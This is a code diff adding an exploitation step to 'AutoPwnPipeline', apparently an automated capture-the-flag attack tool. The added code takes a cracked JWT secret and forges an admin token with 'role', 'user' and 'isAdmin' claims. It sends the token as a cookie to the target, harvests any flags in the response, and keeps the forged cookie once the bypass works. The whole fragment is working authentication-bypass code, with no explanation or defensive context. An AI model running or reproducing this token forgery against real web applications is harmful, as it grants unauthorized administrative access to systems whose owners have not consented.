@@ -2090,6 +2090,19 @@ class AutoPwnPipeline:
                 print_success(f"JWT Secret Key Cracked: [bold green]{cracked}[/bold green]")
                 self.state["leaked_secrets"]["jwt_secret"] = cracked
                 self._log_step("Phase 4: Exploitation", f"Cracked JWT Secret: {cracked}")
+                
+                # Exploit it to get the flag!
+                try:
+                    from modules.jwt_tool import sign_jwt_hs256
+                    forged = sign_jwt_hs256({}, {"role": "admin", "user": "admin", "isAdmin": True}, cracked)
+                    r = self.session.get(self.target_url, cookies={cname: forged}, timeout=4)
+                    self._check_and_store_flags(r.text, "JWT Cracked Secret Response")
+                    if "admin" in r.text.lower() or "flag" in r.text.lower():
+                        print_success(f"JWT Cracked Bypass Succeeded on cookie '{cname}'!")
+                        self.session.cookies.set(cname, forged)
+                        self._log_step("Phase 4: Exploitation", "JWT cracked secret forged admin token")
+                except Exception as e:
+                    print_error(f"Failed to forge and use cracked JWT: {e}")
 
     def _exploit_cbc_bitflip(self):
         """
